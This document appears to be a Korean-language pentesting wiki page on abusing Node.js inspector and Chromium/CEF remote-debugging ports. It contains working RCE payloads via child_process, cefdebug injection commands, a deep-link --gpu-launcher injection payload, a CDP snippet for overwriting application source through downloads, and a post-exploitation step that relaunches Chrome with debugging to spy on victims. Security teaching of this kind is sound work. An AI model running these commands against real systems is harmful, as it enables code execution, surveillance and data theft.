# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

[문서에서](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` switch와 함께 시작하면 Node.js 프로세스는 debugging client의 연결을 수신합니다. **기본적으로**, 호스트 및 포트 **`127.0.0.1:9229`**에서 수신합니다. 각 프로세스에는 **고유한** **UUID**도 할당됩니다.

Inspector clients가 연결하려면 호스트 주소, 포트 및 UUID를 알고 지정해야 합니다. 전체 URL은 다음과 같은 형식입니다: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> **debugger는 Node.js 실행 환경에 대한 모든 권한을 가지므로**, 이 포트에 연결할 수 있는 악성 actor는 Node.js 프로세스를 대신하여 임의의 코드를 실행할 수 있습니다(**potential privilege escalation**).

Inspector를 시작하는 방법은 여러 가지가 있습니다:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
검사 중인 process를 시작하면 다음과 같은 내용이 표시됩니다:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) 기반 프로세스는 **debugger**를 열기 위해 `--remote-debugging-port=9222` param을 사용해야 합니다(SSRF protections는 여전히 매우 유사합니다). 그러나 **NodeJS** **debug** session을 제공하는 대신 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 사용해 browser와 통신합니다. 이는 browser를 제어하기 위한 interface이지만, 직접적인 RCE는 없습니다.

debug된 browser를 시작하면 다음과 같은 내용이 나타납니다:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets 및 same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

웹-browser에서 열리는 웹사이트는 browser security model에 따라 WebSocket 및 HTTP requests를 수행할 수 있습니다. **고유한 debugger session id를 얻으려면** **초기 HTTP connection**이 필요합니다. **same-origin-policy**는 웹사이트가 **이 HTTP connection**을 생성하지 못하도록 **차단합니다**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**에** 대한 추가 보안을 위해 Node.js는 connection의 **'Host' headers**가 정확히 **IP address** 또는 **`localhost`** 또는 **`localhost6`**을 지정하는지 확인합니다.

> [!TIP]
> 이 **security measure는 단순히 HTTP request를 전송하는 것만으로** inspector를 exploit하여 code를 실행하는 것을 방지합니다(SSRF vuln을 exploit하면 가능).

### 실행 중인 process에서 inspector 시작하기

실행 중인 nodejs process에 **signal SIGUSR1**을 전송하여 기본 port에서 **inspector를 시작**하게 만들 수 있습니다. 그러나 충분한 privileges가 필요하므로, 이는 **process 내부의 information에 대한 privileged access**를 부여할 수 있지만 직접적인 privilege escalation은 아닙니다.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> **process를 종료하고** `--inspect`를 사용해 **새 process를 시작하는 것**은 **container**가 process와 함께 **종료되기** 때문에 **옵션이 아닙니다**. 따라서 이는 container에서 유용합니다.

### inspector/debugger에 연결

**Chromium 기반 브라우저**에 연결하려면 Chrome 또는 Edge에서 각각 `chrome://inspect` 또는 `edge://inspect` URL에 액세스할 수 있습니다. Configure 버튼을 클릭하여 **target host와 port가 올바르게 나열되어 있는지** 확인해야 합니다. 다음 이미지는 Remote Code Execution (RCE) 예시를 보여 줍니다:

![debugger에 액세스할 URL이 표시됩니다. 예: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger에 연결: Chromium 기반 브라우저에 연결하려면,...](<../../images/image (674).png>)

**command line**을 사용하면 다음과 같이 debugger/inspector에 연결할 수 있습니다:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
도구 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)는 로컬에서 실행 중인 **inspectors**를 **find**하고 해당 대상에 **code**를 **inject**할 수 있습니다.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> **Chrome DevTools Protocol**을 통해 브라우저에 연결된 경우 **NodeJS RCE exploits가 작동하지 않는다는 점에 유의하세요**([**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)에 연결된 경우 API를 확인하여 수행할 수 있는 흥미로운 작업을 찾아야 합니다).

## NodeJS Debugger/Inspector의 RCE

> [!TIP]
> [**Electron의 XSS에서 RCE를 얻는 방법을 찾고 있다면 이 페이지를 확인하세요.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

**Node inspector**에 **연결**할 수 있을 때 **RCE**를 얻는 일반적인 방법은 다음과 같은 것을 사용하는 것입니다(이는 **Chrome DevTools protocol에 연결된 경우 작동하지 않는 것으로 보입니다**).
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API는 여기에서 확인할 수 있습니다: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
이 섹션에서는 사람들이 이 protocol을 exploit하는 데 사용한 흥미로운 사례를 나열하겠습니다.

### Deep Links를 통한 Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)에서 Rhino security는 CEF 기반 application이 시스템에 **custom UR**I(workspaces://index.html)를 등록하고, 전체 URI를 받은 다음 해당 URI로부터 일부 configuration을 구성하여 **CEF 기반 applicatio**n을 실행한다는 사실을 발견했습니다.

URI parameters가 URL decoded된 후 CEF 기반 application을 실행하는 데 사용되는 것으로 밝혀졌으며, 이를 통해 사용자가 **`--gpu-launcher`** flag를 **command line**에 **inject**하여 임의의 작업을 실행할 수 있었습니다.

따라서 다음과 같은 payload를 사용할 수 있습니다:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe를 실행합니다.

### 파일 덮어쓰기

**다운로드한 파일이 저장될 폴더**를 변경하고, 파일을 다운로드하여 애플리케이션에서 자주 사용하는 **소스 코드**를 **악성 코드**로 **덮어씁니다**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE 및 exfiltration

이 [post](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)에 따르면 theriver에서 RCE를 획득하고 내부 페이지를 exfiltration할 수 있습니다.

### Post-Exploitation

실제 환경에서 **Chrome/Chromium 기반 browser를 사용하는 사용자 PC를 compromise한 후** Chrome process를 **debugging이 활성화된 상태로 실행하고 debugging port를 port-forward**하여 액세스할 수 있습니다. 이렇게 하면 **victim이 Chrome으로 수행하는 모든 작업을 inspect하고 민감한 정보를 steal**할 수 있습니다.

stealth한 방법은 **모든 Chrome process를 terminate**한 다음 다음과 같은 명령을 호출하는 것입니다
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 참고 자료

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
